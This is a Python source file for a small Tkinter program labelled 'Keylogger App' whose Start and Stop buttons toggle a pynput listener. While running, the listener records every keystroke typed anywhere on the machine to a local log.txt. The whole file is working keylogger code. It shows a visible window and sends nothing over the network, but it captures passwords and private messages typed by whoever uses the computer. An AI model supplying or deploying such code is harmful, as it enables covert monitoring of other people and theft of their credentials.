import tkinter as tk
from tkinter import messagebox
from pynput.keyboard import Listener
import threading

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger App")
        self.root.geometry("300x150")

        self.is_logging = False

        self.label = tk.Label(root, text="Keylogger is not running")
        self.label.pack(pady=10)

        self.start_button = tk.Button(root, text="Start Logging", command=self.start_logging)
        self.start_button.pack(pady=5)

        self.stop_button = tk.Button(root, text="Stop Logging", command=self.stop_logging, state=tk.DISABLED)
        self.stop_button.pack(pady=5)

    def start_logging(self):
        self.is_logging = True
        self.label.config(text="Keylogger is running")
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.log_thread = threading.Thread(target=self.log_keys)
        self.log_thread.start()

    def stop_logging(self):
        self.is_logging = False
        self.label.config(text="Keylogger is not running")
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)

    def log_keys(self):
        def on_press(key):
            if not self.is_logging:
                return False
            try:
                with open("log.txt", "a") as log_file:
                    log_file.write(f'{key.char}')
            except AttributeError:
                with open("log.txt", "a") as log_file:
                    log_file.write(f'{key}')
        
        with Listener(on_press=on_press) as listener:
            listener.join()

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
